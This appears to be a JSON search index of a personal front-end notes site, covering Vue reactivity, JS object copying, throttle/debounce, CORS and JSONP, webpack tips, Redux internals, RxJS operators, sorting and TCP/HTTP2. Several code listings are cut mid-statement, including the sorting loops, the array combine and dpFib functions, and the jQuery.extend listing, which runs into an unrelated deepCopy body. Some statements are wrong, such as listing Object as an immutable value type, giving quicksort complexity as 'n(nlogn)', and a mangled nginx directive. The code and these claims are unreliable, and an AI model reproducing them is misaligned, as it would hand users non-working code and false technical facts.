v-show is to hide the component by display: none by CSS.\n\nIf the component will be rendered frequently, v-show is the better choice because repaint performs much better than reflow.\nv-if can toggle whole component life cycle.\n","title":"Template Syntax"},"object_proxy.html":{"content":"Object Proxy\n\nIn Vue 2, it uses Object.defineProperty to proxy data, and in Vue 3, it will use Proxy to do it.\n\nObject.defineProperty\n\nIts definition is as below:\n\n/**\n Adds a property to an object, or modifies attributes of an existing property.\n @param o Object on which to add or modify the property. This can be a native JavaScript object\n (that is, a user-defined object or a built in object) or a DOM object.\n @param p The property name.\n @param attributes Descriptor for the property. It can be for a data property or an accessor property.\n */\ndefineProperty(o: any, p: PropertyKey, attributes: PropertyDescriptor & ThisType): any;\n\nThe PropertyDescriptor's properties see in the MDN document.\n\nDeep Observe and Observe An Array\n\nclass Watcher {\n\n    private arrayProto: any[] = [];\n\n    constructor() {\n        this.arrayProto = Object.create(Array.prototype);\n        ['push', 'pop', 'shift', 'unshift', 'splice'].forEach(fn => {\n            const updateView = this.updateView;\n            this.arrayProto[fn] = function() {\n                Array.prototype[fn].call(this, ...arguments);\n                updateView();\n            }\n        });\n    }\n\n    updateView() {\n        console.log('render');\n    }\n\n    observer(target: any) {\n        const targetType: string = Object.prototype.toString.call(target);\n        // if it is not Object\n        if (!target || !targetType.startsWith('[object ')) {\n            return target;\n        }\n\n        // if it is an array, replace its prototype\n        if (targetType === '[object Array]') {\n            target.proto = this.arrayProto;\n        }\n\n        for (let item in target) {\n            let value = target[item];    // avoid circular reference\n            this.observer(value);\n            Object.defineProperty(target, item, {\n                get: () => value,\n                set: newValue => {\n                    if (newValue !== value) {\n                        value = newValue;\n                        this.updateView();\n                    }\n                }\n            });\n        }\n    }\n}\n\nconst watcher = new Watcher();\nconst obj = {\n    a: 1,\n    b: {\n        c: 1\n    },\n    d: [{}]\n};\nwatcher.observer(obj);\nobj.a = 2;\nobj.b.c = 3;\nobj.d.push(1);\n\nProblems\n\nFrom the implementation as above, we can say there are some limitations.\n\nit cannot observer object add new property and delete property. (use Vue.set and Vue.delete instead)\nit has to observer whole object at once\nit cannot observe an array's change\n\nProxy\n\nTODO\n\nReference\n","title":"Object Proxy"},"life_cycle.html":{"content":"Vue Life Cycle\n\nLife Cycle Hooks\n\nThere is an image from official website of Vue.\n\nParent and Children\n\nWhen a Vue component is instantiated with a child component, their life cycle hooks' sequence is as below:\n\nparent created\nchild created\nchild mounted\nparent mounted\nparent beforeUpdate\nchild beforeUpdate\nchild updated\nparent updated\nchild destroyed\nparent destroyed\n\nVue has to create the parent object, after that, to create the child object.\n\nIn contrast, after the child component is rendered, we can say a parent component's rendering is finished, destroying a component is like the same.\n\n$nextTick\n","title":"Vue Life Cycle"},"object_copy.html":{"content":"Value object and Reference Object\n\nBefore talking about Object's copy, there is a key point that the differences between Value object and Reference Object in JS.\n\nJS basic data type including Number, String, Null, Undefined, Boolean, Object and Symbol, whose value is invariable. When I first know it, I feel quite confused. Because when I process string, I feel I was changing its value.\n\nBut my intuition is wrong, actually, every time I just deassign a new variable.\n\nFor example:\n\nvar str = '123';\nstr[0] = '0';\nconsole.log(str);   //'123'\n\nWhen we are using === to compare 2 value objects, we are do comparing their values.\n\nBut for Reference Object, the fact is not. Reference Object's variable name points to a memory address where save the real content's memory address.\nTherefore, when we are comparing Reference Object, we are comparing their pointers.\n\nThere is a typical example to show that one is value, one is pointer:\n\nvar a = {value:1};\nvar b = a;\nb.value = 2;\nconsole.log(a); //a.value becomes 2 too.\n\nvar c = 1;\nvar d = c;\nd++;\nconsole.log(c); //1\nconsole.log(d); //2\n\nShallow copy\n\nAccording to the above, the key point to copy an object is to copy its value object instead of Reference Object, which can avoid to only copy a\npointer.\n\nLike as below:\n\nlet obj = {\n    a:0,\n    b:1,\n    c:2\n}\n\nfunction shallowCopy(src){\n    let dist = {};\n    for (let key in src){\n        if (src.hasOwnProperty(key)){\n            dist[key] = src[key];\n        }\n    }\n    return dist;\n}\n\nlet copy = shallowCopy(obj);\ncopy.a= 1;\nconsole.log(obj);\nconsole.log(copy);\n\nDeep copy\n\nFor those objects including Reference Object, shallow copy is not enough.\nWe need to split whole objects to Value Objects.\n\nThe jQuery.extend as the example:\n\njQuery.extend = jQuery.fn.extend = function() {\n\tvar options, name, src, copy, copyIsArray, clone,\n\t\ttarget = arguments[ 0 ] || {},\n\t\ti = 1,\n\t\tlength = arguments.length,\n\t\tdeep = false;\n\n\t// Handle a deep copy situation\n\tif ( typeof target === \"boolean\" ) {\n\t\tdeep = target;\n\n\t\t// Skip the boolean and the target\n\t\ttarget = arguments[ i ] || {};\n\t\ti++;\n\t}\n\n\t// Handle case when target is a string or something (possible in deep copy)\n\tif ( typeof target !== \"object\" && typeof target !== \"function\" ) {\n\t\ttarget = {};\n\t}\n\n\t// Extend jQuery itself if only one argument is passed\n\tif ( i === length ) {\n\t\ttarget = this;\n\t\ti--;\n\t}\n\n\tfor ( ; i {\n            copy.push(deepCopy(item))\n        });\n        return copy;\n    }\n\n    let copy = {};\n    for (let key in source){\n        if (source.hasOwnProperty(key)){\n            copy[key] = deepCopy(source[key]);\n        }\n    }\n    return copy;\n}\n\nlet obj = {\n    a:{\n        value:1\n    },\n    b:2\n}\nlet copy = deepCopy(obj)\ncopy.a.value = 0;\nconsole.log(obj);\nconsole.log(copy);\n\nThat's all. If I make something wrong, welcome to contact me to let me modify it!\n","title":"Value object and Reference Object"},"flat_array.html":{"content":"JS Array\n\nFlatten\n\nThe problem is from the link.\n\nThere is a multi-level layers array:\n\nvar arr = [ [1, 2, 2], [3, 4, 5, 5], [6, 7, 8, 9, [11, 12, [12, 13, [14] ] ] ], 10];\n\nHow can I get a plain array and sort it without repetition? My thinking is as below:\n\nfunction flatten(source){\n    if (Object.prototype.toString.call(source) !== '[object Array]'){\n        return [source];\n    }\n    let target = [];\n    for (let i in source){\n        target = target.concat(flatten(source[i]));\n    }\n    return target;\n}\nlet result = Array.from(new Set(flatten(arr))).sort((a,b)=>a-b);\nconsole.log(result);\n\nThere is a more clear way I found:\n\nArray.from(new Set(arr.flat(Number.POSITIVE_INFINITY))).sort((a,b)=>a-b);\n\nIf you have some better way to solve this question, welcome to write it!\n\nCombine\n\n[1, 2, 3, 4, 6, 7, 9, 13, 15] => ['1->4', '6->7', '9', '13', '15']\n\nfunction combine(source) {\n    const ret = [];\n    let start = null;\n    let index = 0;\n    while (index ${source[index]}`);\n            start = null;\n        }\n        index++;\n    }\n    return ret;\n}\n","title":"JS Array"},"debounce_throttle.html":{"content":"Throttle and Debounce\n\nThrottle\n\nThinking about a scenario, there is a button which will send a http request when clicked by a user.\n\nObviously, if an impatient user clicked it for multiple times at short time, the page would send many unnecessary\nrequests to the backend.\n\nOne solution is to disable the button until the request got its response, one solution is to throttle the button, which means at certain time, it will send only one request.\n\nThere is a implementation.\n\nconst throttle = (fn, delay)=>{\n    let avaliable = true;                //closure to save the timeout task handler\n    return (...args) => {\n        if (!avaliable) return;\n        avaliable = false;\n        setTimeout(()=>{\n            fn.apply(this, args);\n            avaliable = true;\n        }, delay);\n    }\n};\n\ndocument.getElementsByTagName('button')[0].addEventListener('click', throttle((e)=>{\n    console.log(e);\n}, 2000));\n\nDebounce\n\nUnlike throttle, debounce is to cancel last uncompleted task.\n\nIf there is a page which will auto save something after the user make an update, we can debounce the save until\nno more updates for a set period of time. That way we don't spam the save function.\n\nconst debounce = (fn, delay)=>{\n    let task = null;\n    return (...args)=>{\n        clearTimeout(task);\n        task = setTimeout(()=>{\n            fn.apply(this, args);\n        }, delay);\n    }\n};\n\ndocument.getElementsByTagName('button')[0].addEventListener('click', debounce((e)=>{\n    console.log(e);\n}, 2000));\n","title":"Throttle and Debounce"},"cross_domain.html":{"content":"Cross Original Resource Sharing\n\nFor security reasons, browsers restrict cross-origin HTTP requests initiated from scripts.\n\nSo only in the browser, we have to consider about cors.\n\nAllow CORS\n\nSome HTML tags\n\nSuch as ` or `, they will not be restricted by browsers' cross-domain policy. But the problem is that it can't process response.\n\nJSONP\n\nIf we want to get data from other site, and the server has designed JSONP API for us, we can use it. For example:\n\nClient side:\n\nfunction jsonp(url, callback) {\n    window.callback = callback;\n    let script = document.createElement('script');\n    script.setAttribute(\"type\",\"text/javascript\");\n    script.src = url;\n    document.body.insertBefore(script, document.body.lastChild);\n}\n\njsonp(\"http://localhost:9093/jsonp\", data => {\n    //do something to the data got from the server\n});\n\nServer side (Node.js):\n\nres.writeHead(200, {\"Content-Type\":\"application/javascript\"};\nres.end(window.callback(${JSON.stringify({a:1,b:2};)}));\n\nAccess-Control-Allow-Methods\n\nIf response headers include Access-Control-Allow-Methods, the browser know the server allow CORS. Such as below:\n\nres.setHeader(\"Access-Control-Allow-Origin\", \"*\");\nres.setHeader(\"Access-Control-Allow-Headers\",\n    \"Access-Control-Allow-Headers, \" +\n    \"Origin,Accept, \" +\n    \"X-Requested-With, \" +\n    \"Content-Type, \" +\n    \"Access-Control-Request-Method, \" +\n    \"Access-Control-Request-Headers\");\nres.setHeader(\"Access-Control-Allow-Methods\",\"POST,GET,OPTIONS\");\n\nCredentials\n\nSending request to third party domain with cookies. in fetch, set credentials to include, mode to cors.\n\nThe server response headers must include Access-Control-Allow-Credentials: true, if not, the client will be not allowed to access the response content.\n\n> Notice: When making credentialed requests to a different domain, third-party cookie policies will still apply. The policy is always enforced independent of any setup on the server and the client, as described in this chapter.\n\nHeaders\n\nWhen cors, the client can not access all http response headers, except it's CORS-safelisted response header.\n\nFor example, if want to redirect and append location to response headers, we should append Access-Control-Expose-Headers: location first.\n\nReference\n","title":"Cross Original Resource Sharing"},"memory_leak.html":{"content":"Memory Leak\n\nBrowser\n\nNodeJS\n\nCompared to the memory leak in the browser, nodejs memory leak maybe is more dangerous.\n\nAs it runs on the server side and normally run for a long time, if the memory leak leads to crush the service, it can be a disaster.\n\nThe common leaking codes in nodejs is as below:\n\nglobal variables\n\nclosure\n\nEventEmitter\n\nHow to detect and analysis memory leak\n\nReference\n","title":"Memory Leak"},"webpack_optimization.html":{"content":"Webpack Optimization\n\n虽然在使用react或者vue的时候，cra和vue-cli已经配置好了绝大部分的选项，但是在调优和自己打包项目时，还是需要对webpack的一些配置有一些认识。\n\nOptimization主要分为开发时的打包速度优化，和打包后的代码性能优化。\n\nModule, Chunk and Bundle\n\nModule: Discrete chunks of functionality that provide a smaller surface area than a full program. Well-written modules provide solid abstractions and encapsulation boundaries which make up a coherent design and clear purpose.\n\nChunk: This webpack-specific term is used internally to manage the bundling process. Bundles are composed out of chunks, of which there are several types (e.g. entry and child). Typically, chunks directly correspond with the output bundles however, there are some configurations that don't yield a one-to-one relationship.\n\nBundle: Produced from a number of distinct modules, bundles contain the final versions of source files that have already undergone the loading and compilation process.\n\nOptimization Of Packaging\n\n使用高版本的webpack和node\nthread-loader: 多进程池打包优化，放在每个load rule的最前面。对一些小项目甚至可能会打包的更慢，所以cra不会默认开启\nload rule里的exclude和include, 尽量忽略不需要打包的模块\nresolve中的几个选项，resolve.modules指明第三方模块的绝对路径，resolve.mainFields减少搜索步骤，resolve.extensions尽可能减少后缀尝试的可能性, noParse忽略不需要打包的第三方库\nbabel-loader开启缓存\n合理选择devtool策略，比如source-map就是最慢的，但是可以百分百追踪source，如果想构建更快，在可接受的范围内可以选择一些cheap的策略。但是尽量避免使用inline-和eval-, 因为会让bundle体积变大\n\nOptimization Of Bundle Performance\n\nmode设置为production\n小图用url-loader变为base64\nsplitChunks减小包体积，和增加不变代码缓存率\noptimization里的terser-webpack-plugin, 对js压缩\nmini-css-extract-plugin抽取css并压缩，提高缓存率\nlazy load: 使用es6的import方法引入模块，webpack支持自动代码分割，可以提升首屏性能\ntree shaking: 可以移除未使用的代码。但是必须满足一些条件：使用esm和package.json中设置sideEffects\nscope hoisting: 开启scope hoisting后代码会被直接注入，减少了函数开销和代码体积。但是和tree shaking一样，虽然mode: \"production\"中ModuleConcatenationPlugin默认开启concatenateModules, 但是只对esm起作用。\n\nWebpack Tools\n\nwebpack-bundle-analyzer: 对bundle体积大小分析可视化工具\nsize-plugin: 对包大小变化监控的工具\nwebpack-merge: 多份配置合并工具\n\nReact Webpack Options\n\n可以eject出配置，但是不支持，因为不能随着react-scripts升级，所以不推荐，但是自由度可以说是最高的\n使用react-app-rewired, 在config-overrides.js中添加配置，把指令从react-scripts改为react-app-rewired\n使用customize-cra, 改一些有限的小配置比较方便\n\nVue Webpack Options\n\n在vue.config.js中添加要改写的配置。\n\nReference\n","title":"Webpack Optimization"},"npm_issue.html":{"content":"issue a npm project\n\nFirstly, make sure the npm has been initialized in the project. Next next, input:\n\nnpm login\n\nand enter your username, password, email in npmjs. After that, input:\n\nnpm publish\n\nIt will ask to enter some information of the package, actually, it is the same fields of package.json, which can be\nedited after publishing.\n\nOne tip, the same version number is not allowed, so every time before publishing, it is imperative to change version number\nin package.json.\n\nFor more information about the package.json fields, npm-package.json\n","title":"issue a npm project"},"redux.html":{"content":"Event bus\n\nLike Command bus in PHP and EventBus in Android, event bus is a traditional design for the communication\namong different components. Its key point is dispatch/subscribe or emit/on.\n\nThere is a simple example in JS:\n\nexport default new class EventBus{\n    constructor() {\n        this.events = {};\n    }\n\n    on(eventName, callback){\n        const event = this.events[eventName];\n        if (event){\n            event.push(callback);\n        } else {\n            this.events[eventName] = [callback];\n        }\n    }\n\n    emit(eventName, ...args){\n        const event = this.events[eventName];\n        if (Array.isArray(event)){\n            event.forEach(callback=>{\n                callback.apply(this, args);\n            })\n        }\n    }\n}();\nIt creates a new object to save and transmit event.\n\nFor me, I feel event bus has these 3 obvious drawbacks:\n\nthe dispatcher is difficult to know the event result\nthe only identifier is event's name, which means maybe multiple subscriber use one\nevent name. It will make data and event structure quite chaotic.\nit is difficult to trace event process.\n\nFlux\n\nFlux is a Design Pattern, which complements components by utilizing a unidirectional data flow.\n\nThere is a image to show it:\n\nAs we can see, it means views cannot directly update its UI by change data, it has to use Action to change data saved in the Store whose change\ncan change UI.\n\nIt remind me of this.setState in React, which also uses actions to change UI.\n\nIn traditional MVC, it looks like:\n\nBut by Flux, different components who want to change the same state saved in the store have to use the same way (Action) to update UI.\n\nRedux\n\nRedux is an implementation of Flux, many of the concepts that apply to Redux apply to Flux as well.\n\nbuild simple Redux\n\nFirstly, there is a simple Redux base on redux createStore:\n\nexport function createStore(reducer) {\n\n    let currentState = {};\n    const currentListeners = [];\n\n    function getState() {\n        return currentState;\n    }\n\n    function subscribe(event) {\n        currentListeners.push(event);\n    }\n\n    function dispatch(action) {\n        currentState = reducer(currentState, action);\n        currentListeners.forEach(e=>{e()});\n        return action;\n    }\n\n    return {getState, subscribe, dispatch}\n}\n\nThere is only one store, compared to Flux that allows multiple store. It does not allow to change data directly. Users\ninput Actions instead of data, next, Reducer will transfer Actions to data and update State in Store.\n\nPrinciples\n\nThere are 3 principle in Redux:\n\nSingle source of truth\n\n    The state of your whole application is stored in an object tree within a single store.\n\nState is read-only\n\n    The only way to change the state is to emit an action, an object describing what happened.\n\nChanges are made with pure functions\n\n    To specify how the state tree is transformed by actions, you write pure reducers.\n\nState tree\n\nIn a real project, we may have lots of components and have to maintain lots of states. If these whole states are\nsaved in one Store with the same Reducer, apparently, the Reducer will be large and complex.\n\nSo in Redux, there is combineReducers to combine Reducers, making each Reducer is independent.\n\nEach Reducer has its state, which compose the State tree in the Store, definition is as below:\n\nconst store = ()=>createStore({\n    state1: reducer1,\n    state2: reducer2\n})\n\nreact-redux\n\nThe official UI binding library for Redux. See why use React Redux.\n\nThe key functions in it is Provider and connect.\n\nProvider\n\nProvider is a React component, it will automatically subscribe:\n\n componentDidMount() {\n    this.state.subscription.trySubscribe()\n\n    if (this.previousState !== this.props.store.getState()) {\n      this.state.subscription.notifyNestedSubs()\n    }\n  }\n    componentDidUpdate(prevProps) {\n      if (this.props.store !== prevProps.store) {\n        this.state.subscription.tryUnsubscribe()\n        const subscription = new Subscription(this.props.store)\n        subscription.onStateChange = this.notifySubscribers\n        this.setState({ store: this.props.store, subscription })\n      }\n    }\n\nThe Provider will be the root component of whole Application.\n\nconnect\n\nThe function of connect is to wrap getState and dispatch to components' props.\n\nIt will receive 4 parameters:\n\nmapStateToProps\n\n    connect state in store to props\n\nmapDispatchToProps\n\n    connect actions to props\n\nmergeProps\n\noptions\n\nThere is a vivid image describing how react-redux works:\n\nRedux middleware\n\nIn Redux, everything data is from one state to another state. When the data is changing, we can add our own\nfunctions.\n\nIn this way, the flow of data becomes like:\n\n> view -> action -> middleware -> reducer -> store\n\nRedux's middleware is based on two functions: compose and applyMiddleware. Actually, they are very short.\n\ncompose\n\nThe compose is as below:\n\n//compose.js\nexport default function compose(...funcs) {\n  if (funcs.length === 0) {\n    return arg => arg\n  }\n\n  if (funcs.length === 1) {\n    return funcs[0]\n  }\n\n  return funcs.reduce((a, b) => (...args) => a(b(...args)))\n}\nFor example, if there are 3 functions are input, the result is like:\n((...args)=>{\n    return ((...args)=>{\n        return fn1(fn2(...args))\n    })(fn3(...args))\n})(...args)\n\nIf will combine whole functions to one function, the execution order is from right to hand according to its input order, last function's\nreturn value is next function's arguments.\n\napplyMiddleware\n\nthe source code is as blow:\n\nimport compose from './compose'\nexport default function applyMiddleware(...middlewares) {\n  return createStore => (...args) => {\n    const store = createStore(...args)\n    let dispatch = () => {\n      throw new Error(\n        'Dispatching while constructing your middleware is not allowed. ' +\n          'Other middleware would not be applied to this dispatch.'\n      )\n    }\n\n    const middlewareAPI = {\n      getState: store.getState,\n      dispatch: (...args) => dispatch(...args)\n    }\n    //whole redux middle can get middlewareAPI\n    const chain = middlewares.map(middleware => middleware(middlewareAPI))\n    dispatch = compose(...chain)(store.dispatch)\n\n    return {\n      ...store,\n      dispatch\n    }\n  }\n}\n\nBefore execute disptch function, it will execute the curried middleware function. The next actually is dispatch.\n\nredux-thunk\n\nWithout using react-redux, I won't use redux asynchronize plugins such as redux-thunk or redux-saga, because in the callback function, I can\ndirectly use subsribe function. But anyway, react-redux is helpful in React, so these plugins's use is imperative in react.\n\nThe source code of redux-thunk is so short... In my imagination, it may be longer. The whole source code is as below:\n\nfunction createThunkMiddleware(extraArgument) {\n  return ({ dispatch, getState }) => next => action => {\n    if (typeof action === 'function') {\n      return action(dispatch, getState, extraArgument);\n    }\n\n    return next(action);\n  };\n}\n\nconst thunk = createThunkMiddleware();\nthunk.withExtraArgument = createThunkMiddleware;\n\nexport default thunk;\n\nIf the action is a function instead of an object that is the only type redux can receive, redux-thunk will\nintercept dispatch(action), and return the object that is action(dispatch).\n","title":"Event bus"},"rxjs.html":{"content":"RxJs\n\nBasic use\n\nThe impetus drives me to learn RxJS is that lots of people recommend it and said: React + Redux + RxJS = Amazing!.\n\nBefore learning it, there is a simple function: make an element is draggable.\n\nUsing DOM event to do, the code see in JSFiddle.\n\nThe example base on RxJS, the code see in JSFiddle.\n\nFrom these 2 examples, I feel RxJS is quite like Promise. Compared to traditional event system, it is easier to\nextend and package logic and variables in a function.\n\nWhat's more, in it, it can return multiple values via next(). And using operators to process\nevent stream.\n\nThere is an image to show it:\n\nOperator\n\nOperators are methods on the Observable type, such as .map(...), .filter(...), .merge(...), etc. When called, they do not change the existing Observable instance. Instead, they return a new Observable, whose subscription logic is based on the first Observable.\n\npipe\n\nAny functions can be in pipe, but finally, they need return an Observable instance.\n\nswitchMap\n\nA way to cancel stale events. An example as below:\n\nimport { fromEvent, interval } from 'rxjs';\nimport { switchMap } from 'rxjs/operators';\n\nconst obs$1 = fromEvent(document, 'click');\nconst obs$2 = interval(1000);\nconst finalObs$ = obs$1.pipe(\n  switchMap(event => obs$2)\n);\nconst subscription = finalObs$.subscribe((value) => console.log(value));\n\nmergeMap\n\nA way to merge events. An example as below:\n\nimport { of } from 'rxjs';\nimport { mergeMap, map  } from 'rxjs/operators';\n\nconst firstNameObs$ = of('Naveen');\nconst lastNameObs$ = of('Chandupatla');\nconst finalObs$ = firstNameObs$.pipe(\n  mergeMap(event1 => lastNameObs$.pipe(map(event2 => event1+' '+event2)))\n);\nconst subscription = finalObs$.subscribe((value) => console.log(value));\n\ntap\n\nA way to perform transparent actions such as logging. An example as below:\n\nimport { of } from 'rxjs';\nimport { tap, map } from 'rxjs/operators';\n\nconst obs$ = of(1, 2, 3, 4, 5);\nobs$.pipe(\n  tap(val => console.log(BEFORE MAP: ${val})),\n  map(val => val + 10),\n  tap(val => console.log(AFTER MAP: ${val}))\n).subscribe(val => console.log(val));\n\nmap\n\na way to traverse observable's each value.\n\npluck\n\na way to extract specific value from observable.\n\nimport { from } from 'rxjs';\nimport { pluck } from 'rxjs/operators';\n\nconst data = [{id:1, value:'one'}, {id:2, value:'two'}, {id:3, value:'three'}];\n\nconst obsPluck$ = from(data).pipe(\n  pluck('value')\n).subscribe(x => console.log(x));\n\nconst obsMap$ = from(data).pipe(\n  map(data => data.value)\n).subscribe(x => console.log(x));\n\ndebounceTime && distinctUntilChanged && throttleTime\n\nA simple way to anti-shaking and throttling.\n\nimport { fromEvent } from 'rxjs';\nimport { pluck,map, debounceTime, distinctUntilChanged } from 'rxjs/operators';\n\nconst input = document.querySelector('input');\nconst obs$ = fromEvent(input, 'input');\nobs$.pipe(\nmap(event => event.target.value),\ndebounceTime(1000),\nthrottleTime(3000),\ndistinctUntilChanged())\n.subscribe((value) => console.log(value));\n\ncatchError\n\nA way to handle errors.\n\nimport { fromEvent, from, of } from 'rxjs';\nimport { catchError } from 'rxjs/operators';\n\nconst defaultRejectedPromise = () =>\n  new Promise((resolve, reject) =>\n  reject('defaultRejectedPromise!'));\n\nconst sourceObs$ = from(defaultRejectedPromise());\nsourceObs$.pipe(catchError(error => of(Bad Promise: ${error})))\n.subscribe(next => console.log(next));\n\ncombineLatest\n\nA way to get latest value among multiple events\n\nimport { timer, combineLatest } from 'rxjs';\n\n//timerOne emits first value at 1s, then once every 4s\nconst timerOne$ = timer(1000, 4000);\n//timerTwo emits first value at 2s, then once every 4s\nconst timerTwo$ = timer(2000, 4000);\n//timerThree emits first value at 3s, then once every 4s\nconst timerThree$ = timer(3000, 4000);\n//when one timer emits, emit the latest values from each timer as an array\ncombineLatest(timerOne$, timerTwo$, timerThree$).subscribe(\n  (items) => {\n    console.log(\n    `Timer One Latest: ${items[0]},\n     Timer Two Latest: ${items[1]},\n     Timer Three Latest: ${items[2]}`\n    );\n  }\n);\n\nzip\n\nA way to wait for all observable to emit and then it zips those values into an array as an output.\n\nimport { timer, zip } from 'rxjs';\n\n//timerOne emits first value at 1s, then once every 4s\nconst timerOne$ = timer(1000, 4000);\n//timerTwo emits first value at 2s, then once every 4s\nconst timerTwo$ = timer(2000, 4000);\n//timerThree emits first value at 3s, then once every 4s\nconst timerThree$ = timer(3000, 4000);\n//when one timer emits, emit the latest values from each timer as an array\nzip(timerOne$, timerTwo$, timerThree$).subscribe(\n  (items) => {\n    console.log(\n    `Timer One Latest: ${items[0]},\n     Timer Two Latest: ${items[1]},\n     Timer Three Latest: ${items[2]}`\n    );\n  }\n);\n\nHot vs Cold Observables\n\nNormally, Observables is cold, which means the code is executed when it is subscribed. Each subscribe will create a new event.\n\nHot Observables means the event is single, each subscribe will access the only event instance.\n\nWe can use share to transfer cold Observables to hot Observables.\n\nThere is code to show it:\n\nlet obs = new Observable(subscriber => {\n    setInterval(()=>{\n        subscriber.next(Date.now());\n    },500)\n}).pipe(share());\n\nlet task = obs.subscribe(v=>{\n    console.log(v);\n});\nsetTimeout(()=>{\n    task.unsubscribe();\n}, 1000);\n\nsetTimeout(()=>{\n    let task = obs.subscribe(v=>{\n        console.log(v);\n    });\n    setTimeout(()=>{\n        task.unsubscribe();\n    }, 1000);\n}, 1000);\n","title":"RxJs"},"rn_bridges.html":{"content":"Bridge Module\n\nTODO\n\nWhat is JSBridge\n\nNative Module in RN\n\nReference\n","title":"Bridge Module"},"utility_types.html":{"content":"Utility Types\n\nSee Official Documents in here .\n\nThe concept of Utility Types in TS, for me, it is kink of similar to  Option and Result in Rust.\n\nThere are some of real implementation of common Utility Types in here.\n\nPick and Omit\n\nExclude and Extract\n\nPartial and Required\n\nParameters and ReturnType\n\nconst f = (p1: string, p2: number) => ({ p1, p2 });\ntype P = Parameters;\ntype R = ReturnType;\nconst p: P = ['1', 2];\nconst r: R = f(...p);\n\nReadonly\n\nRecord\n\nGet Key of Enum\n\nenum NUM {\n    A,\n    B,\n    C\n}\ntype T = keyof typeof NUM;\n","title":"Utility Types"},"mini_program.html":{"content":"基于React的小程序跨平台方案\n\nTODO\n\nCompile Time\n\nRax:\n\nRuntime\n\nTaro 3.0+:\nRemax:\n\nReference\n","title":"基于React的小程序跨平台方案"},"concepts.html":{"content":"Algorithm\n\nAccording to its definition in Wikipedia, an algorithm is a finite sequence of well-defined, computer-implementable instructions, typically to solve a class of problems or to perform a computation.\n\nGrowth Rate Of Function\n\nFor different algorithms, with the growth of the amount of input data, the increasing of the number of elementary operations is different. Thus, We can use the time complexity to describe it:\n\nthe amount of time it takes to run an algorithm. Time complexity is commonly estimated by counting the number of elementary operations performed by the algorithm, supposing that each elementary operation takes a fixed amount of time to perform.\n\nThe chart as below illustrates their growth rate:\n\nAs we can see, O(n!) and O(2^n)'s growth rate is rapid to such a degree that in practical scenario, we can't accept an algorithm in these time complexity.\n\nData Structure\n\nDivide-And-Conquer Method\n","title":"Algorithm"},"common_sort.html":{"content":"Sorting Algorithm\n\nBubble Sort\n\nBubble Sort is the simplest sorting algorithm that works by repeatedly swapping the adjacent elements if they are in wrong order.\n\n((arr)=>{\n    for (let i = arr.length -1; i > 0; i--){\n        for (let j = 0; j  arr[j+1]){\n                let temp = arr[j];\n                arr[j] = arr[j+1];\n                arr[j+1] = temp;\n            }\n        }\n    }\n    return arr;\n})(Array(100).fill(null).map(() => Math.round(Math.random()*100)));\n\nSelection Sort\n\nIt is the reverse of Bubble Sorting.\n\n((arr)=>{\n    for (let i=0;i Math.round(Math.random()*100)));\n\nQuick Sort\n\nA typical implementation of Divide-and-Conquer Method, selecting a pivot and using it to split the array to two part.\n\nNormally, its time complexity is n(nlogn). In worst situation that the first selected pivot is the extremum of the array, its time complexity is n(n^2).\n\n(_arr=>{\n    const quickSort = arr => {\n        if (arr.length  item  item >= pivot))];\n    };\n    return quickSort(_arr);\n})(Array(100).fill(null).map(() => Math.round(Math.random()*100)));\n\nInsert Sort\n\nShell Sort\n\nHeap Sort\n\nMerge Sort\n\nBucket Sort\n","title":"Sorting Algorithm"},"common_hash.html":{"content":"\nMD5\n\nSHA\n","title":""},"dp.html":{"content":"Dynamic Programming\n\nconst recursionFib = (n: number): number => {\n\tif (n === 1 || n === 2) return 1;\n\treturn recursionFib(n - 1) + recursionFib(n - 2);\n};\n\nconst dpFib = (n: number): number => {\n\tconst dp = Array(n + 1).fill(0);\n\tdp[1] = dp[2] = 1;\n\tfor (let i = 3; i\n","title":"Dynamic Programming"},"tail_recursion.html":{"content":"尾递归\n\nReference\n","title":"尾递归"},"osi.html":{"content":"Hierarchical Network Modal\n","title":"Hierarchical Network Modal"},"ip.html":{"content":"Internet Protocol\n\nSegment\n\nICMP\n\nARP & RARP\n\nFrame\n\nReference\n","title":"Internet Protocol"},"udp.html":{"content":"UDP\n\nFrame\n","title":"UDP"},"tcp.html":{"content":"TCP/IP\n\nTCP/IP protocol can provide a reliable link between two computers, if packet get lost, it is re-transmitted. TCP itself rides on top of IP, which provides unified addressing to communicate between computers. TCP/IP is a basis for internet and 99% of other networks.\n\nFrame\n\nFlags Field\n\nURG—Indicates that some urgent data has been placed.\nACK—Indicates that acknowledgement number is valid.\nPSH—Indicates that data should be passed to the application as soon as possible.\nRST—Resets the connection.\nSYN—Synchronizes sequence numbers to initiate a connection.\nFIN—Means that the sender of the flag has finished sending data.\n\nConnection Establishment\n\nThe setup steps make sure both of them can receive and send data to each other.\n\nthe client send a SYN to the server. In this step, the server knows it can receive data from the client.\n\nthe server replies with a SYN-ACK. In this step, the client knows it can receive data and send data to the server.\n\nthe client sends an ACK back to the server. In this step, the server knows the client can receive data it sent.\n\nConnection Termination\n\nThe termination uses a four-way handshake, with each side of the connection terminating independently.\n\nEach side needs to send a FIN and ACK packet to another side. Therefore, a typical tear-down requires a pair of FIN and ACK segments from each TCP endpoint.\n\nThere is a picture to show it:\n\nWhy the initiator needs to wait for 2 maximum segment lifetime?\n\nIf the receiver doesn't get its ACK packet from the initiator, it will resend a FIN to the initiator. It can guarantee the connection can be teardown safely.\n\nCaptured TCP package by Wireshark\n\nAs Http is over TCP, we can send a Http request and see its packages.\n\nI typed an url in the browser and pressing enter. After the page was loaded, I closed the page. The Wireshark result is as below:\n\nReference\n\nMDN:\n峰哥关于tcp的博客:\n","title":"TCP/IP"},"http.html":{"content":"Http\n\nMessage Structure\n\nHTTP requests, and responses, share similar structure and are composed of:\n\nA start-line describing the requests to be implemented, or its status of whether successful or a failure. This start-line is always a single line.\n\nAn optional set of HTTP headers specifying the request, or describing the body included in the message.\n\nA blank line indicating all meta-information for the request has been sent.\n\nAn optional body containing data associated with the request (like content of an HTML form), or the document associated with a response. The presence of the body and its size is specified by the start-line and HTTP headers.\n","title":"Http"},"http2.html":{"content":"Http2\n\nsetup http2 in nginx:\n\nserver {\n    listen 443 ssl http2;\n\n    ssl_certificate server.crt;\n    sslcertificatekey server.key;\n}\n\nMain New Features\n\nSee a Demo by Akamai.\n\nheader compression\n\nIn Http1.1, the header is plain text, of course, it is more easy for people to read, but it will cost lots of space when the header is large.\n\nEven more, SSL will change the header as binary, which means it is actually necessary to show as plain text. So in Http2, the header becomes index with a static table. It will make each request smaller.\n\nmultiplexing\n\nIn Http1.1, the transmission is parallel, therefore next file has to wait to be transferred until the last transmission is finished if connection: keep-alive, which obviously waste current bandwidth.\n\nIn Http2, it will transfer multiple files mixed in one connection. Each 